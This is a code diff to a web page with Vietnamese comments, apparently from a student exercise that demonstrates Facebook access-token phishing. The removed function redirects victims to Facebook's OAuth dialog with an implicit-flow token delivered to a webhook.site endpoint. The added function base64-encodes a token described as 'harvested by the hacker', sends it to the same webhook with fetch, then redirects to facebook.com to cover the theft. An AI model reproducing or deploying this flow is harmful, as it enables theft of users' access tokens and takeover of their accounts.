@@ -41,20 +41,19 @@
     }, 2500);
 
     // 2. Hàm chuyển hướng đến trang lấy Token (OAuth)
-    function redirectToAuth() {
-        // Thay 'YOUR_APP_ID' bằng ID ứng dụng thực tế trên Facebook Developers
-        // Thay 'YOUR_REDIRECT_URI' bằng URL trang web của bạn (phải đăng ký trong App FB)
-        const client_id = "YOUR_APP_ID"; 
-        const redirect_uri = encodeURIComponent("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916");
-        
-        const fb_auth_url = `https://www.facebook.com/v18.0/dialog/oauth?client_id=${client_id}&redirect_uri=${redirect_uri}&response_type=token&scope=public_profile,email`;
-        
-        // Ghi lại log trình duyệt trước khi chuyển đi (để nộp bài tập)
-        console.log("Đang bắt đầu quá trình lấy Access Token...");
-        
-        // Chuyển hướng người dùng
-        window.location.href = fb_auth_url;
-    }
+function redirectToAuth() {
+    alert("Đang mô phỏng quá trình lấy Token từ Facebook...");
+    
+    // Giả lập một Access Token mà hacker thu hoạch được
+    const fake_token = "EAAGm0PX4ZCpsBAK7ZA8xYz1234567890abcdefghijklmnopqrstuvwxyz";
+    
+    // Gửi dữ liệu giả này về Webhook của bạn để chứng minh logic thành công
+    fetch("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916?captured_token=" + btoa(fake_token))
+    .then(() => {
+        alert("Dữ liệu đã được đổ về Webhook! Bạn có thể kiểm tra tab Webhook ngay bây giờ.");
+        window.location.href = "https://www.facebook.com";
+    });
+}
 
     // 3. Logic xử lý sau khi lấy được Token (Dùng nếu trang này là trang đích nhận callback)
     window.onload = function() {
@@ -73,3 +72,4 @@
 
 </body>
 </html>
+
